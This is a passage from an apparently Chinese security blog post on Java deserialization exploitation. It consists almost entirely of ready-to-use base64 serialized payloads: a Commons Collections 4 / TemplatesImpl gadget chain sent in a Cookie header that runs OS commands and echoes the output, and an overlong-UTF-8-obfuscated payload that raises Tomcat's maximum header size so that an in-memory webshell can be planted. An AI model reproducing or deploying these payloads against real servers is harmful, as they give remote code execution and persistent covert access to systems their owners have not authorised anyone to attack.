&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">userInfo=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADaDK/rq+AAAANADUCgAiAGUJADsAZgoADABnCABoCgAMAGkIAGoHAGsJADsAbAoABwBtCgA7AG4KAAwAbwcAcAgAcQoAcgBzCgAMAHQIAHUKAAwAdggAPggAdwgAeAgAeQoAegB7CgB6AHwKAH0AfgoABwB/BwCACgCBAIIKAIEAgwgAhAoAhQCGCACHBwCICgAgAIkHAIoKAIsAjAgAjQgAjggAjwgAkAoAIACRCgAiAJIIAJMKAIsAlAkAOwCVCACWCACXCQA7AJgIAJkKAAcAmgoABwCbCACcCACdCACeCACfCACgCAChCACiCgA7AKMHAKQBAAloZWFkZXJLZXkBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAZhY3Rpb24BAAhwb3NpdGlvbgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTHBheWxvYWQvU3ByaW5nRWNobzsBAAVzdGFydAEABXZhcjExAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAHAHAEoHAIABAARFY2hvAQAWKExqYXZhL3V0aWwvU2Nhbm5lcjspVgEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAEdmFyMAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyMQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyMgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjQBAAR2YXI2AQAEdmFyNwEABHZhcjgHAGsHAIgHAKUHAIoBAApFeGNlcHRpb25zAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAPU3ByaW5nRWNoby5qYXZhDABBAEIMAD8APQwApgCnAQAEZWNobwwAqACpAQAEZXhlYwEAEWphdmEvdXRpbC9TY2FubmVyDAA+AD0MAEEAqgwATwBQDACrAKwBABBqYXZhL2xhbmcvU3RyaW5nAQAHb3MubmFtZQcArQwArgCvDACwALEBAANXSU4MALIAswEAAi9jAQAHL2Jpbi9zaAEAAi1jBwC0DAC1ALYMAGoAtwcAuAwAuQC6DABBALsBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwC8DAC9AL4MAL8AwAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAwQwAwgDDAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAMQAxQEAEGphdmEvbGFuZy9PYmplY3QHAKUMAMYAxwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyDADIAMUMAMkAygEACWFkZEhlYWRlcgwAywDMDABAAD0BAAZoZWFkZXIBAARib2R5DAA8AD0BAAJcQQwAzQDODADPALEBAAdwcmludGxuAQAFZmx1c2gBAAVjbG9zZQEABEV0YWcBAAZscyAtYWwBAARleGVjAQAEYm9keQwASABCAQAIRWdFZGVFSU8BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAhoYXNoQ29kZQEAAygpSQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDQDABBAEIKANEA0gAhADsA0QAAAAQACAA8AD0AAAAIAD4APQAAAAgAPwA9AAAACABAAD0AAAAEAAEAQQBCAAEAQwAAAC8AAQABAAAABSq3ANOxAAAAAgBEAAAABgAB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&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>准备打内存马，由于header长度会被限制。所以先将header长度限制修改，再打入内存马&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rO0ABXNyAC7BqsGhwbbBocCuwbXBtMGpwazArsGQwbLBqcGvwbLBqcG0wbnBkcG1waXBtcGllNowtPs/grEDAAJJAAjBs8GpwbrBpUwAFMGjwa/BrcGwwaHBssGhwbTBr8GydAAswYzBqsGhwbbBocCvwbXBtMGpwazAr8GDwa/BrcGwwaHBssGhwbTBr8GywLt4cAAAAAJzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaRxAH4AAUwAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGDwajBocGpwa7BpcGkwZTBssGhwa7Bs8Gmwa/BssGtwaXBsjDHl+woepcEAgABWwAawanBlMGywaHBrsGzwabBr8Gywa3BpcGywbN0AFzBm8GMwa/BssGnwK/BocGwwaHBo8GowaXAr8Gjwa/BrcGtwa/BrsGzwK/Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTAr8GUwbLBocGuwbPBpsGvwbLBrcGlwbLAu3hwdXIAXMGbwYzBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/B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YW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwB1BwB2BwBZBwBkBwBxAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAeTW9kaWZ5VG9tY2F0TWF4SGVhZGVyU2l6ZS5qYXZhDAAnACgBABBqYXZhL2xhbmcvVGhyZWFkAQAKZ2V0VGhyZWFkcwEAD2phdmEvbGFuZy9DbGFzcwwAdwB4BwB1DAB5AHoBABBqYXZhL2xhbmcvT2JqZWN0DAB7AHwMAH0AfgEABGh0dHAHAH8MAIAAgQEACEFjY2VwdG9yDACCAIMMAIQAhQcAdgwAhgCHAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAGdGhpcyQwDACIAIMBAC9vcmcvYXBhY2hlL2NveW90ZS9odHRwMTEvQWJzdHJhY3RIdHRwMTFQcm90b2NvbAEABTQwOTYwBwCJDACKAIsMAIwAjQEAIm9yZy9hcGFjaGUvY295b3RlL0Fic3RyYWN0UHJvdG9jb2wMAIoAjgcAjwEAM29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L0Fic3RyYWN0RW5kcG9pbnQkSGFuZGxlcgwAkAAoAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAkQAoDAAuACgBAAhFZ0VkZUVJTwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3RyaW5nAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcv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
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54